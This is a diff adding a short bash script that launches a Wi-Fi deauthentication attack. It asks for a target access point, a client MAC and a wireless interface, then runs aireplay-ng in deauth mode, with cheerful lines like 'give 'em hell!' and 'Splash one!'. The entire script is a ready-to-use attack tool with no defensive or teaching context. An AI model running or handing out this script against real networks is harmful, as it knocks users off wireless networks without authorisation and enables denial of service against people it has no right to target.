@@ -1,0 +1,17 @@
+#!/bin/bash
+echo "this is going to run a DeAuth attack on a targeted Access Point localized"
+echo "to a specific target client."
+echo "       "
+sleep 1
+echo "give 'em hell!"
+echo "             "
+sleep 2
+read -p "Insert Target's AP: " targetAP
+read -p "Insert Target MAC: " targetCLIENT
+read -p "Insert wlan interface to use: " wlanINT
+read -p "0, 1, or 5? : " deauthnum
+sudo aireplay-ng -0 $deauthnum -a $targetAP -c $targetCLIENT --deauth-rc 15 $wlanINT
+sleep 1
+echo "Sending deauth to $targetCLIENT from AP: $targetAP."
+echo "          "
+echo "Splash one!"
